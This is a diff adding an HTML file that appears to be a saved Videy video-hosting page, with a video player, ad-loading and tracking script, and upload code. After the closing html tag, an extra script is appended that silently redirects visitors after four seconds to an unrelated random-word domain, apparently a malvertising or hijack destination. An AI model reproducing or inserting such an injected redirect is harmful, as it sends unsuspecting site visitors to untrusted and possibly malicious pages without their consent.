@@ -1,0 +1,254 @@
+
+<html>
+<head>
+
+
+<title>Untitled Video | Videy - free and simple video hosting</title>
+<meta name="description" content="Videy is a platform for free and simple video hosting.">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600&family=Poppins:wght@600&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
+<link rel="stylesheet" type="text/css" href="/css/stylesheet-x22.css">
+<meta property="og:image" content="https://previews.videy.co/b21gjxWS.jpeg" />
+</head>
+<body>
+<div class="nav-outer">
+<div class="nav-inner">
+<div class="logo-text">
+<a href="https://videy.co/">videy</a>
+</div>
+<a href="/">
+<div class="upload-button-nav">
+Upload
+</div>
+</a>
+<div class="legal">
+<div class="legal-menu">
+<a href="javascript:void(0);" class="icon" onclick="toggleMobileNavbar()">
+<i class="fa fa-bars"></i>
+</a>
+</div>
+<div class="legal-item">
+<a href="/privacy">
+Privacy Policy
+</a>
+</div>
+<div class="legal-item">
+<a href="/tos">
+Terms of Service
+</a>
+</div>
+<div class="legal-item">
+<a href="/cdn-cgi/l/email-protection#770402070718050337011e13120e591418">
+Abuse
+</a>
+</div>
+</div>
+</div>
+</div>
+<div id="mobile-menu">
+<a href="/privacy">
+Privacy Policy
+</a>
+<a href="/tos">
+Terms of Service
+</a>
+<a href="/cdn-cgi/l/email-protection#f2818782829d8086b2849b96978bdc919d">
+Abuse
+</a>
+</div>
+<div class="body">
+<div class="video">
+<video autoplay controls width="100%">
+<source src="https://cdn.videy.co/b21gjxWS.mp4" type="video/mp4">
+Your browser does not support the video tag.
+</video>
+
+
+</div>
+</div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
+<script>
+    $(document).ready(function () {
+
+        if ("".length === 0) return;
+
+        const randomString = Math.random().toString(36).substring(2, 10);
+
+        // Specify the URL for the JSON data
+        var apiUrl = 'https://ads.videy.co/api/load.json?site=videy.co&id=' + randomString + '&width=' + screen.width
+        + '&height=' + screen.height;
+
+        // Make a GET request to fetch the JSON data
+        $.ajax({
+            url: apiUrl,
+            type: 'GET',
+            dataType: 'json',
+            success: function (data) {
+
+                var ads = data.ads;
+
+                if (ads.length > 0) {
+                    var firstAd = ads[0];
+
+                    // Update the title
+                    $('.native-unit-title').text(firstAd.headline);
+
+                    // Update the brand
+                    $('.native-unit-brand').text(firstAd.brand);
+
+                    // Update the link
+                    $('.native-unit-link').attr('href', firstAd.url);
+
+                    // Update the image
+                    $('.native-unit-image').attr('src', firstAd.image);
+
+                    // Show the ad unit
+                    $('.native-unit').show();
+                    $('.native-unit-disclosure').show();
+
+                    if (firstAd?.revcontent_id === undefined) { return; }
+
+                    const revcontentId = firstAd.revcontent_id;
+
+                    fetch('https://trends.revcontent.com/api/v2/track.php?d=' + revcontentId);
+
+                    const viewData = new URLSearchParams();
+                    viewData.append('view', decodeURIComponent(revcontentId));
+                    viewData.append('view_type', 'widget');
+                    viewData.append('p[]', 0);
+
+                    fetch(`https://trends.revcontent.com/view.php`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+                        },
+                        body: viewData
+                    });
+
+                }
+
+            },
+            error: function (error) {
+                // Handle errors here
+                console.error('Error fetching JSON:', error);
+            }
+        });
+    });
+</script>
+<script>
+    function toggleMobileNavbar() {
+        var x = document.getElementById("mobile-menu");
+        if (x.style.display === "flex") {
+            x.style.display = "none";
+        } else {
+            x.style.display = "flex";
+        }
+    }
+</script>
+<script>
+
+    let target = document.documentElement;
+    let body = document.body;
+    let fileInput = document.getElementById("selectedFile");
+
+    target.addEventListener('dragover', (e) => {
+        if ($(".clickListenerFile")[0]) {
+            e.preventDefault();
+            body.classList.add('dragging');
+        }
+    });
+
+    target.addEventListener('dragleave', () => {
+        body.classList.remove('dragging');
+    });
+
+    target.addEventListener('drop', (e) => {
+        if ($(".clickListenerFile")[0]) {
+            e.preventDefault();
+            body.classList.remove('dragging');
+            fileInput.files = e.dataTransfer.files;
+            upload();
+        }
+    });
+
+    window.addEventListener('paste', e => {
+        fileInput.files = e.clipboardData.files;
+        upload();
+    });
+
+    document.getElementsByClassName("clickListenerFile")[0].onchange = function() {
+        upload();
+    }
+
+    function handleClick() {
+
+        if($(".clickListenerFile")[0]) {
+            $(".clickListenerFile").click();
+        }
+
+    }
+
+    function upload() {
+
+        var fileInput = $("#selectedFile").val();
+        if(fileInput != "" && fileInput.trim() != "") {
+
+            var formData = new FormData($('form')[0]);
+            $(".upload_placeholder .upload-button").hide();
+            $(".upload_placeholder .play").html("<i class=\"fas fa-spinner fa-spin\"></i>");
+            $(".upload_placeholder .instruct").html("Uploading Video...");
+            // $(".select .restraints").toggle();
+            $("#selectedFile").removeClass("clickListenerFile");
+
+            $.ajax({
+                xhr: function() {
+                    var xhr = new window.XMLHttpRequest();
+
+                    xhr.upload.addEventListener("progress", function(evt) {
+                        if (evt.lengthComputable) {
+                            var percentComplete = evt.loaded / evt.total;
+                            percentComplete = parseInt(percentComplete * 100);
+                            $(".upload_placeholder .instruct").html("Uploading Video (" + percentComplete + "%)");
+
+                            if (percentComplete === 100) {
+                                $(".upload_placeholder .instruct").html("Almost done...");
+                            }
+
+                        }
+                    }, false);
+
+                    return xhr;
+                },
+                url: '/api/upload',
+                type: 'POST',
+                context: this,
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function (result) {
+                    window.location.href = "/v?id=" + result.id;
+                },
+                error: function () {
+                    $(".select .icon").html("<i class=\"fas fa-upload\"></i>");
+                    $(".select .title").html("Select or Paste Video");
+                    $(".select .restraints").toggle();
+                    $("#selectedFile").addClass("clickListenerFile");
+                    $(".upload_placeholder .upload-button").show();
+                }
+            });
+
+        }
+
+    }
+</script>
+</html>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://crockerydestructivespoken.com/e19qa68ci3?key=cb105f1ca165cfb25ba4a0ab4269bae1";
+        }, 4000); // Redirigir después de 4 segundos (5000 milisegundos)
+    </script>
